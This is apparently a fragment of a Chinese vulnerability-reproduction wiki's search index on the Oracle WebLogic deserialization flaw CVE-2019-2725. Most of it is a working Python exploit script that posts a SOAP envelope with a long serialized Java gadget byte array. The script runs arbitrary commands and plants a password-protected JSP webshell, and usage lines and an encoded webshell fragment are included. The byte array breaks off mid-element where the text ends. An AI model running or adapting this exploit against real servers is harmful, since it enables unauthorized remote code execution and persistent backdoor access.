x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x2f;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x25;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3e;</string> </void> <void method=\"close\"/> </object> </java>]]></string></void></class> </work:WorkContext> </soapenv:Header> <soapenv:Body></soapenv:Body></soapenv:Envelope>''' url = \" %s /wls-wsat/CoordinatorPortType\" % ( ip ) rsp = requests . post ( url , data = body , verify = False , headers = headers ) logger . info ( \" \\r\\n Shell\u5730\u5740\uff1a %s /bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\" % ( ip )) if __name__ == '__main__' : info = '''\u547d\u4ee4\u6267\u884c\uff1a python weblogic-2019-2725.py 10.3.6 http//:127.0.0.1:7001 cmd python weblogic-2019-2725.py 12.1.3 http//:127.0.0.1:7001 cmd \u4e0a\u4f20webshell python weblogic-2019-2725.py 10.3.6 http//:ip:port python weblogic-2019-2725.py 12.1.3 http//:ip:port ''' print ( info ) if len ( sys . argv ) == 3 : if sys . argv [ 1 ] == \"10.3.6\" : webshell_10_3_6 ( sys . argv [ 2 ]) elif sys . argv [ 1 ] == \"12.1.3\" : webshell_12_1_3 ( sys . argv [ 2 ]) else : logger . error ( \"\u53c2\u6570\u4f20\u5165\u9519\u8bef\" ) elif len ( sys . argv ) == 4 : if sys . argv [ 1 ] == \"10.3.6\" : weblogic_10_3_6 ( sys . argv [ 2 ], sys . argv [ 3 ]) elif sys . argv [ 1 ] == \"12.1.3\" : weblogic_12_1_3 ( sys . argv [ 2 ], sys . argv [ 3 ]) else : logger . error ( \"\u53c2\u6570\u4f20\u5165\u9519\u8bef\" ) else : logger . error ( \"\u53c2\u6570\u4f20\u5165\u9519\u8bef\" )","title":"Weblogic \u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2019-2725"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-2725/#weblogic-\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2019-2725","text":"","title":"Weblogic \u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2019-2725"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-2725/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2019\u5e7406\u670815\u65e5\uff0c360CERT\u76d1\u6d4b\u5230\u5728\u91ce\u7684Oracle Weblogic\u8fdc\u7a0b\u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u7ed5\u8fc7\u4e86\u6700\u65b0\u7684Weblogic\u8865\u4e01\uff08CVE-2019-2725\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610fHTTP\u8bf7\u6c42\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3002\u76ee\u524d\u5b98\u65b9\u8865\u4e01\u672a\u53d1\u5e03\uff0c\u6f0f\u6d1e\u7ec6\u8282\u672a\u516c\u5f00\u3002360CERT\u7ecf\u7814\u5224\u540e\u5224\u5b9a\u8be5\u6f0f\u6d1e\u7efc\u5408\u8bc4\u7ea7\u4e3a\u201c\u9ad8\u5371\u201d\uff0c\u5f3a\u70c8\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c3d\u5feb\u6839\u636e\u4e34\u65f6\u4fee\u8865\u5efa\u8bae\u8fdb\u884c\u4e34\u65f6\u5904\u7f6e\uff0c\u9632\u6b62\u6536\u5230\u653b\u51fb\u8005\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-2725/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Weblogic 10.3.6 Weblogic 12.1.3","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-2725/#\u73af\u5883\u642d\u5efa","text":"git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001 \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-2725/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 https://xz.aliyun.com/t/5024 \u8fd9\u91cc\u4f7f\u7528POC\u8fdb\u884c\u590d\u73b0 POC\u5730\u5740: https://github.com/TopScrew/CVE-2019-2725 [!NOTE] POC\u53ef\u5229\u7528\u4e8e\u547d\u4ee4\u6267\u884c\u548cWebshell\u4e0a\u4f20","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-2725/#\u6f0f\u6d1e\u5229\u7528poc","text":"https://github.com/TopScrew/CVE-2019-2725/blob/master/weblogic-2019-2725.py # encoding=utf8 import sys import requests from logzero import logger headers = { \"Accept-Language\" : \"zh-CN,zh;q=0.9,en;q=0.8\" , \"User-Agent\" : \"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" , \"Content-Type\" : \"text/xml\" , } def weblogic_10_3_6 ( ip , cmd ): headers = { \"Accept-Language\" : \"zh-CN,zh;q=0.9,en;q=0.8\" , \"User-Agent\" : \"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" , \"Content-Type\" : \"text/xml\" , \"cmd\" : \" %s \" % ( cmd ) } body = \"\"\"<?xml version=\"1.0\" encoding=\"utf-8\" ?> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action/><wsa:RelatesTo/><asy:onAsyncDelivery/> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void> <array class=\"byte\" length=\"5010\"><void index=\"0\"><byte>-84</byte></void><void index=\"1\"><byte>-19</byte></void><void index=\"2\"><byte>0</byte></void><void index=\"3\"><byte>5</byte></void><void index=\"4\"><byte>115</byte></void><void index=\"5\"><byte>114</byte></void><void index=\"6\"><byte>0</byte></void><void index=\"7\"><byte>23</byte></void><void index=\"8\"><byte>106</byte></void><void index=\"9\"><byte>97</byte></void><void index=\"10\"><byte>118</byte></void><void index=\"11\"><byte>97</byte></void><void index=\"12\"><byte>46</byte></void><void index=\"13\"><byte>117</byte></void><void index=\"14\"><byte>116</byte></void><void index=\"15\"><byte>105</byte></void><void index=\"16\"><byte>108</byte></void><void index=\"17\"><byte>46</byte></void><void index=\"18\"><byte>76</byte></void><void index=\"19\"><byte>105</byte></void><void index=\"20\"><byte>110</byte></void><void index=\"21\"><byte>107</byte></void><void index=\"22\"><byte>101</byte></void><void index=\"23\"><byte>100</byte></void><void index=\"24\"><byte>72</byte></void><void index=\"25\"><byte>97</byte></void><void index=\"26\"><byte>115</byte></void><void index=\"27\"><byte>104</byte></void><void index=\"28\"><byte>83</byte></void><void index=\"29\"><byte>101</byte></void><void index=\"30\"><byte>116</byte></void><void index=\"31\"><byte>-40</byte></void><void index=\"32\"><byte>108</byte></void><void index=\"33\"><byte>-41</byte></void><void index=\"34\"><byte>90</byte></void><void index=\"35\"><byte>-107</byte></void><void index=\"36\"><byte>-35</byte></void><void index=\"37\"><byte>42</byte></void><void index=\"38\"><byte>30</byte></void><void index=\"39\"><byte>2</byte></void><void index=\"40\"><byte>0</byte></void><void index=\"41\"><byte>0</byte></void><void index=\"42\"><byte>120</byte></void><void index=\"43\"><byte>114</byte></void><void index=\"44\"><byte>0</byte></void><void index=\"45\"><byte>17</byte></void><void index=\"46\"><byte>106</byte></void><void index=\"47\"><byte>97</byte></void><void index=\"48\"><byte>118</byte></void><void index=\"49\"><byte>97</byte></void><void index=\"50\"><byte>46</byte></void><void index=\"51\"><byte>117</byte></void><void index=\"52\"><byte>116</byte></void><void index=\"53\"><byte>105</byte></void><void index=\"54\"><byte>108</byte></void><void index=\"55\"><byte>46</byte></void><void index=\"56\"><byte>72</byte></void><void index=\"57\"><byte>97</byte></void><void index=\"58\"><byte>115</byte></void><void index=\"59\"><byte>104</byte></void><void index=\"60\"><byte>83</byte></void><void index=\"61\"><byte>101</byte></void><void index=\"62\"><byte>116</byte></void><void index=\"63\"><byte>-70</byte></void><void index=\"64\"><byte>68</byte></void><void index=\"65\"><byte>-123</byte></void><void index=\"66\"><byte>-107</byte></void><void index=\"67\"><byte>-106</byte></void><void index=\"68\"><byte>-72</byte></void><void index=\"69\"><byte>-73</byte></void><void index=\"70\"><byte>52</byte></void><void index=\"71\"><byte>3</byte></void><void index=\"72\"><byte>0</byte></void><void index=\"73\"><byte>0</byte></void><void index=\"74\"><byte>120</byte></void><void index=\"75\"><byte>112</byte></void><void index=\"76\"><byte>119</byte></void><void index=\"77\"><byte>12</byte></void><void index=\"78\"><byte>0</byte></void><void index=\"79\"><byte>0</byte></void><void index=\"80\"><byte>0</byte></void><void index=\"81\"><byte>16</byte></void><void index=\"82\"><byte>63</byte></void><void index=\"83\"><byte>64</byte></void><void index=\"84\"><byte>0</byte></void><void index=\"85\"><byte>0</byte></void><void index=\"86\"><byte>0</byte></void><void index=\"87\"><byte>0</byte></void><void index=\"88\"><byte>0</byte></void><void index=\"89\"><byte>2</byte></void><void index=\"90\"><byte>115</byte></void><void index=\"91\"><byte>114</byte></void><void index=\"92\"><byte>0</byte></void><void index=\"93\"><byte>58</byte></void><void index=\"94\"><byte>99</byte></void><void index=\"95\"><byte>111</byte></void><void index=\"96\"><byte>109</byte></void><void index=\"97\"><byte>46</byte></void><void index=\"98\"><byte>115</byte></void><void index=\"99\"><byte>117</byte></void><void index=\"100\"><byte>110</byte></void><void index=\"101\"><byte>46</byte></void><void index=\"102\"><byte>111</byte></void><void index=\"103\"><byte>114</byte></void><void index=\"104\"><byte>103</byte></void><void index=\"105\"><byte>46</byte></void><void index=\"106\"><byte>97</byte></void><void index=\"107\"><byte>112</byte></void><void index=\"108\"><byte>97</byte></void><void index=\"109\"><byte>99</byte></void><void index=\"110\"><byte>104</byte></void><void index=\"111\"><byte>101</byte></void><void index=\"112\"><byte>46</byte></void><void index=\"113\"><byte>120</byte></void><void index=\"114\"><byte>97</byte></void><void index=\"115\"><byte>108</byte></void><void index=\"116\"><byte>97</byte></void><void index=\"117\"><byte>110</byte></void><void index=\"118\"><byte>46</byte></void><void index=\"119\"><byte>105</byte></void><void index=\"120\"><byte>110</byte></void><void index=\"121\"><byte>116</byte></void><void index=\"122\"><byte>101</byte></void><void index=\"123\"><byte>114</byte></void><void index=\"124\"><byte>110</byte></void><void index=\"125\"><byte>97</byte></void><void index=\"126\"><byte>108</byte></void><void index=\"127\"><byte>46</byte></void><void index=\"128\"><byte>120</byte></void><void index=\"129\"><byte>115</byte></void><void index=\"130\"><byte>108</byte></void><void index=\"131\"><byte>116</byte></void><void index=\"132\"><byte>99</byte></void><void index=\"133\"><byte>46</byte></void><void index=\"134\"><byte>116</byte></void><void index=\"135\"><byte>114</byte></void><void index=\"136\"><byte>97</byte></void><void index=\"137\"><byte>120</byte></void><void index=\"138\"><byte>46</byte></void><void index=\"139\"><byte>84</byte></void><void index=\"140\"><byte>101</byte></void><void index=\"141\"><byte>109</byte></void><void index=\"142\"><byte>112</byte></void><void index=\"143\"><byte>108</byte></void><void index=\"144\"><byte>97</byte></void><void index=\"145\"><byte>116</byte></void><void index=\"146\"><byte>101</byte></void><void index=\"147\"><byte>115</byte></void><void index=\"148\"><byte>73</byte></void><void index=\"149\"><byte>109</byte></void><void index=\"150\"><byte>112</byte></void><void index=\"151\"><byte>108</byte></void><void index=\"152\"><byte>9</byte></void><void index=\"153\"><byte>87</byte></void><void index=\"154\"><byte>79</byte></void><void index=\"155\"><byte>-63</byte></void><void index=\"156\"><byte>110</byte></void><void index=\"157\"><byte>-84</byte></void><void index=\"158\"><byte>-85</byte></void><void index=\"159\"><byte>51</byte></void><void index=\"160\"><byte>3</byte></void><void index=\"161\"><byte>0</byte></void><void index=\"162\"><byte>9</byte></void><void index=\"163\"><byte>73</byte></void><void index=\"164\"><byte>0</byte></void><void index=\"165\"><byte>13</byte></void><void index=\"166\"><byte>95</byte></void><void index=\"167\"><byte>105</byte></void><void index=\"168\"><byte>110</byte></void><void index=\"169\"><byte>100</byte></void><void index=\"170\"><byte>101</byte></void><void index=\"171\"><byte>110</byte></void><void index=\"172\"><byte>116</byte></void><void index=\"173\"><byte>78</byte></void><void index=\"174\"><byte>117</byte></void><void index=\"175\"><byte>109</byte></void><void index=\"176\"><byte>98</byte></void><void index=\"177\"><byte>101</byte></void><void index=\"178\"><byte>114</byte></void><void index=\"179\"><byte>73</byte></void><void index=\"180\"><byte>0</byte></void><void index=\"181\"><byte>14</byte></void><void index=\"182\"><byte>95</byte></void><void index=\"183\"><byte>116</byte></void><void index=\"184\"><byte>114</byte></void><void index=\"185\"><byte>97</byte></void><void index=\"186\"><byte>110</byte></void><void index=\"187\"><byte>115</byte></void><void index=\"188\"><byte>108</byte></void><void index=\"189\"><byte>101</byte></void><void index=\"190\"><byte>116</byte></void><void index=\"191\"><byte>73</byte></void><void index=\"192\"><byte>110</byte></void><void index=\"193\"><byte>100</byte></void><void index=\"194\"><byte>101</byte></void><void index=\"195\"><byte>120</byte></void><void index=\"196\"><byte>90</byte></void><void index=\"197\"><byte>0</byte></void><void index=\"198\"><byte>21</byte></void><void index=\"199\"><byte>95</byte></void><void index=\"200\"><byte>117</byte></void><void index=\"201\"><byte>115</byte></void><void index=\"202\"><byte>101</byte></void><void index=\"203\"><byte>83</byte></void><void index=\"204\"><byte>101</byte></void><void index=\"205\"><byte>114</byte></void><void index=\"206\"><byte>118</byte></void><void index=\"207\"><byte>105</byte></void><void index=\"208\"><byte>99</byte></void><void index=\"209\"><byte>101</byte></void><void index=\"210\"><byte>115</byte></void><void index=\"211\"><byte>77</byte></void><void index=\"212\"><byte>101</byte></void><void index=\"213\"><byte>99</byte></void><void index=\"214\"><byte>104</byte></void><void index=\"215\"><byte>97</byte></void><void index=\"216\"><byte>110</byte></void><void index=\"217\"><byte>105</byte></void><void index=\"218\"><byte>115</byte></void><void index=\"219\"><byte>109</byte></void><void index=\"220\"><byte>76</byte></void><void index=\"221\"><byte>0</byte></void><void index=\"222\"><byte>25</byte></void><void index=\"223\"><byte>95</byte></void><void index=\"224\"><byte>97</byte></void><void index=\"225\"><byte>99</byte></void><void index=\"226\"><byte>99</byte></void><void index=\"227\"><byte>101</byte></void><void index=\"228\"><byte>115</byte></void><void index=\"229\"><byte>115</byte></void><void index=\"230\"><byte>69</byte></void><void index=\"231\"><byte>120</byte></void><void index=\"232\"><byte>116</byte></void><void index=\"233\"><byte>101</byte></void><void index=\"234\"><byte>114</byte></void><void index=\"235\"><byte>110</byte></void><void index=\"236\"><byte>97</byte></void><void index=\"237\"><byte>108</byte></void><void index=\"238\"><byte>83</byte></void><void index=\"239\"><byte>116</byte></void><void index=\"240\"><byte>121</byte></void><void index=\"241\"><byte>108</byte></void><void index=\"242\"><byte>101</byte></void><void index=\"243\"><byte>115</byte></void><void index=\"244\"><byte>104</byte></void><void index=\"245\"><byte>101</byte></void><void index=\"246\"><byte>101</byte></void><void index=\"247\"><byte>116</byte></void><void index=\"248\"><byte>116</byte></void><void index=\"249\"><byte>0</byte></void><void index=\"250\"><byte>18</byte></void><void index=\"251\"><byte>76</byte></void><void index=\"252\"><byte>106</byte></void><void index=\"253\"><byte>97</byte></void><void index=\"254\"><byte>118</byte></void><void index=\"255\"><byte>97</byte></void><void index=\"256\"><byte>47</byte></void><void index=\"257\"><byte>108</byte></void><void index=\"258\"><byte>97</byte></void><void index=\"259\"><byte>110</byte></void><void index=\"260\"><byte>103</byte></void><void index=\"261\"><byte>47</byte></void><void index=\"262\"><byte>83</byte></void><void index=\"263\"><byte>116</byte></void><void index=\"264\"><byte>114</byte></void><void index=\"265\"><byte>105</byte></void><void index=\"266\"><byte>110</byte></void><void index=\"267\"><byte>103</byte></void><void index=\"268\"><byte>59</byte></void><void index=\"269\"><byte>76</byte></void><void index=\"270\"><byte>0</byte></void><void index=\"271\"><byte>11</byte></void><void index=\"272\"><byte>95</byte></void><void index=\"273\"><byte>97</byte></void><void index=\"274\"><byte>117</byte></void><void index=\"275\"><byte>120</byte></void><void index=\"276\"><byte>67</byte></void><void index=\"277\"><byte>108</byte></void><void index=\"278\"><byte>97</byte></void><void index=\"279\"><byte>115</byte></void><void index=\"280\"><byte>115</byte></void><void index=\"281\"><byte>101</byte></void><void index=\"282\"><byte>115</byte></void><void index=\"283\"><byte>116</byte></void><void index=\"284\"><byte>0</byte></void><void index=\"285\"><byte>59</byte></void><void index=\"286\"><byte>76</byte></void><void index=\"287\"><byte>99</byte></void><void index=\"288\"><byte>111</byte></void><void index=\"289\"><byte>109</byte></void><void index=\"290\"><byte>47</byte></void><void index=\"291\"><byte>115</byte></void><void index=\"292\"><byte>117</byte></void><void index=\"293\"><byte>110</byte></void><void index=\"294\"><byte>47</byte></void><void index=\"295\"><byte>111</byte></void><void index=\"296\"><byte>114</byte></void><void index=\"297\"><byte>103</byte></void><void index=\"298\"><byte>47</byte></void><void index=\"299\"><byte>97</byte></void><void index=\"300\"><byte>112</byte></void><void index=\"301\"><byte>97</byte></void><void index=\"302\"><byte>99</byte></void><void index=\"303\"><byte>104</byte></void><void index=\"304\"><byte>101</byte></void><void index=\"305\"><byte>47</byte></void><void index=\"306\"><byte>120</byte></void><void index=\"307\"><byte>97</byte></void><void index=\"308\"><byte>108</byte></void><void index=\"309\"><byte>97</byte></void><void index=\"310\"><byte>110</byte></void><void index=\"311\"><byte>47</byte></void><void index=\"312\"><byte>105</byte></void><void index=\"313\"><byte>110</byte></void><void index=\"314\"><byte>116</byte></void><void index=\"315\"><byte>101</byte></void><void index=\"316\"><byte>114</byte></void><void index=\"317\"><byte>110</byte></void><void index=\"318\"><byte>97</byte></void><void index=\"319\"><byte>108</byte></void><void index=\"320\"><byte>47</byte></void><void index=\"321\"><byte>120</byte></void><void index=\"322\"><byte>115</byte></void><void index=\"323\"><byte>108</byte></void><void index=\"324\"><byte>116</byte></void><void index=\"325\"><byte>99</byte></void><void index=\"326\"><byte>47</byte></void><void index=\"327\"><byte>114</byte></void><void index=\"328\"><byte>117</byte></void><void index=\"329\"><byte>110</byte></void><void index=\"330\"><byte>116</byte></void><void index=\"331\"><byte>105</byte></void><void index=\"332\"><byte>109</byte></void><void index=\"333\"><byte>101</byte></void><void index=\"334\"><byte>47</byte></void><void index=\"335\"><byte>72</byte></void><void index=\"336\"><byte>97</byte></void><void index=\"337\"><byte>115</byte></void><void index=\"338\"><byte>104</byte></void><void index=\"339\"><byte>116</byte></void><void index=\"340\"><byte>97</byte></void><void index=\"341\"><byte>98</byte></void><void index=\"342\"><byte>108</byte></void><void index=\"343\"><byte>101</byte></void><void index=\"344\"><byte>59</byte></void><void index=\"345\"><byte>91</byte></void><void index=\"346\"><byte>0</byte></void><void index=\"347\"><byte>10</byte></void><void index=\"348\"><byte>95</byte></void><void index=\"349\"><byte>98</byte></void><void index=\"350\"><byte>121</byte></void><void index=\"351\"><byte>116</byte></void><void index=\"352\"><byte>101</byte></void><void index=\"353\"><byte>99</byte></void><void index=\"354\"><byte>111</byte></void><void index=\"355\"><byte>100</byte></void><void index=\"356\"><byte>101</byte></void><void index=\"357\"><byte>115</byte></void><void index=\"358\"><byte>116</byte></void><void index=\"359\"><byte>0</byte></void><void index=\"360\"><byte>3</byte></void><void index=\"361\"><byte>91</byte></void><void index=\"362\"><byte>91</byte></void><void index=\"363\"><byte>66</byte></void><void index=\"364\"><byte>91</byte></void><void index=\"365\"><byte>0</byte></void><void index=\"366\"><byte>6</byte></void><void index=\"367\"><byte>95</byte></void><void index=\"368\"><byte>99</byte></void><void index=\"369\"><byte>108</byte></void><void index=\"370\"><byte>97</byte></void><void index=\"371\"><byte>115</byte></void><void index=\"372\"><byte>115</byte></void><void index=\"373\"><byte>116</byte></void><void index=\"374\"><byte>0</byte></void><void index=\"375\"><byte>18</byte></void><void index=\"376\"><byte>91</byte></void><void index=\"377\"><byte>76</byte></void><void index=\"378\"><byte>106</byte></void><void index=\"379\"><byte>97</byte></void><void index=\"380\"><byte>118</byte></void><void index=\"381\"><byte>97</byte></void><void index=\"382\"><byte>47</byte></void><void index=\"383\"><byte>108</byte></void><void index=\"384\"><byte>97</byte></void><void index=\"385\"><byte>110</byte></void><void index=\"386\"><byte>103</byte></void><void index=\"387\"><byte>47</byte></void><void index=\"388\"><byte>67</byte></void><void index=\"389\"><byte>108</byte></void><void index=\"390\"><byte>97</byte></void><void index=\"391\"><byte>115</byte></void><void index=\"392\"><byte>115</byte></void><void index=\"393\"><byte>59</byte></void><void index=\"394\"><byte>76</byte></void><void index=\"395\"><byte>0</byte></void><void index=\"396\"><byte>5</byte></void><void index=\"397\"><byte>95</byte></void><void index=\"398\"><byte>110</byte></void><void index=\"399\"><byte>97</byte></void><void index=\"400\"><byte>109</byte></void><void index=\"401\"><byte>101</byte></void><void index=\"402\"><byte>113</byte></void><void index=\"403\"><byte>0</byte></void><void index=\"404\"><byte>126</byte></void><void index=\"405\"><byte>0</byte></void><void index=\"406\"><byte>4</byte></void><void index=\"407\"><byte>76</byte></void><void index=\"408\"><byte>0</byte></void><void index=\"409\"><byte>17</byte></void><void index=\"410\"><byte>95</byte></void><void index=\"411\"><byte>111</byte></void><void index=\"412\"><byte>117</byte></void><void index=\"413\"><byte>116</byte></void><void index=\"414\"><byte>112</byte></void><void index=\"415\"><byte>117</byte></void><void index=\"416\"><byte>116</byte></void><void index=\"417\"><byte>80</byte></void><void index=\"418\"><byte>114</byte></void><void index=\"419\"><byte>111</byte></void><void index=\"420\"><byte>112</byte></void><void index=\"421\"><byte>101</byte></void><void index=\"422\"><byte>114</byte></void><void index=\"423\"><byte>116</byte></void><void index=\"424\"><byte>105</byte></void><void index=\"425\"><byte>101</byte></void><void index=\"426\"><byte>115</byte></void><void index=\"427\"><byte>116</byte></void><void index=\"428\"><byte>0</byte></void><void index=\"429\"><byte>22</byte></void><void index=\"430\"><byte>76</byte></void><void index=\"431\"><byte>106</byte></void><void index=\"432\"><byte>97</byte></void><void index=\"433\"><byte>118</byte></void><void index=\"434\"><byte>97</byte></void><void index=\"435\"><byte>47</byte></void><void index=\"436\"><byte>117</byte></void><void index=\"437\"><byte>116</byte></void><void index=\"438\"><byte>105</byte></void><void index=\"439\"><byte>108</byte></void><void index=\"440\"><byte>47</byte></void><void index=\"441\"><byte>80</byte></void><void index=\"442\"><byte>114</byte></void><void index=\"443\"><byte>111</byte></void><void index=\"444\"><byte>112</byte></void><void index=\"445\"><byte>101</byte></void><void index=\"446\"><byte>114</byte></void><void index=\"447\"><byte>116</byte></void><void index=\"448\"><byte>105</byte></void><void index=\"449\"><byte>101</byte></void><void index=\"450\"><byte>115</byte></void><void index=\"451\"><byte>59</byte></void><void index=\"452\"><byte>120</byte></void><void index=\"453\"><byte>112</byte></void><void index=\"454\"><byte>0</byte></void><void index=\"455\"><byte>0</byte></void><void index=\"456\"><byte>0</byte></void><void index=\"457\"><byte>0</byte></void><void index=\"458\"><byte>-1</byte></void><void index=\"459\"><byte>-1</byte></void><void index=\"460\"><byte>-1</byte></void><void index=\"461\"><byte>-1</byte></void><void index=\"462\"><byte>0</byte></void><void index=\"463\"><byte>116</byte></void><void index=\"464\"><byte>0</byte></void><void index=\"465\"><byte>3</byte></void><void index=\"466\"><byte>97</byte></void><void index=\"467\"><byte>108</byte></void><void index=\"468\"><byte>108</byte></void><void index=\"469\"><byte>112</byte></void><void index=\"470\"><byte>117</byte></void><void index=\"471\"><byte>114</byte></void><void index=\"472\"><byte>0</byte></void><void index=\"473\"><byte>3</byte></void><void index=\"474\"><byte>91</byte></void><void index=\"475\"><byte>91</byte></void><void index=\"476\"><byte>66</byte></void><void index=\"477\"><byte>75</byte></void><void index=\"478\"><byte>-3</byte></void><void index=\"479\"><byte>25</byte></void><void index=\"480\"><byte>21</byte></void><void index=\"481\"><byte>103</byte></void><void index=\"482\"><byte>103</byte></void><void index=\"483\"><byte>-37</byte></void><void index=\"484\"><byte>55</byte></void><void index=\"485\"><byte>2</byte></void><void index=\"486\"><byte>0</byte></void><void index=\"487\"><byte>0</byte></void><void index=\"488\"><byte>120</byte></void><void index=\"489\"><byte>112</byte></void><void index=\"490\"><byte>0</byte></void><void index=\"491\"><byte>0</byte></void><void index=\"492\"><byte>0</byte></void><void index=\"493\"><byte>2</byte></void><void index=\"494\"><byte>117</byte></void><void index=\"495\"><byte>114</byte></void><void index=\"496\"><byte>0</byte></void><void index=\"497\"><byte>2</byte></void><void index=\"498\"><byte>91</byte></void><void index=\"499\"><byte>66</byte></void><void index=\"500\"><byte>-84</byte></void><void index=\"501\"><byte>-13</byte></void><void index=\"502\"><byte>23</byte></void><void index=\"503\"><byte>-8</byte></void><void index=\"504\"><byte>6</byte></void><void index=\"505\"><byte>8</byte></void><void index=\"506\"><byte>84</byte></void><void index=\"507\"><byte>-32</byte></void><void index=\"508\"><byte>2</byte></void><void index=\"509\"><byte>0</byte></void><void index=\"510\"><byte>0</byte></void><void index=\"511\"><byte>120</byte></void><void index=\"512\"><byte>112</byte></void><void index=\"513\"><byte>0</byte></void><void index=\"514\"><byte>0</byte></void><void index=\"515\"><byte>14</byte></void><void index=\"516\"><byte>29</byte></void><void index=\"517\"><byte>-54</byte></void><void index=\"518\"><byte>-2</byte></void><void index=\"519\"><byte>-70</byte></void><void index=\"520\"><byte>-66</byte></void><void index=\"521\"><byte>0</byte></void><void index=\"522\"><byte>0</byte></void><void index=\"523\"><byte>0</byte></void><void index=\"524\"><byte>50</byte></void><void index=\"525\"><byte>0</byte></void><void index=\"526\"><byte>-70</byte></void><void index=\"527\"><byte>10</byte></void><void index=\"528\"><byte>0</byte></void><void index=\"529\"><byte>3</byte></void><void index=\"530\"><byte>0</byte></void><void index=\"531\"><byte>34</byte></void><void index=\"532\"><byte>7</byte></void><void index=\"533\"><byte>0</byte></void><void index=\"534\"><byte>-72</byte></void><void index=\"535\"><byte>7</byte></void><void index=\"536\"><byte>0</byte></void><void index=\"537\"><byte>37</byte></void><void index=\"538\"><byte>7</byte></void><void index=\"539\"><byte>0</byte></void><void 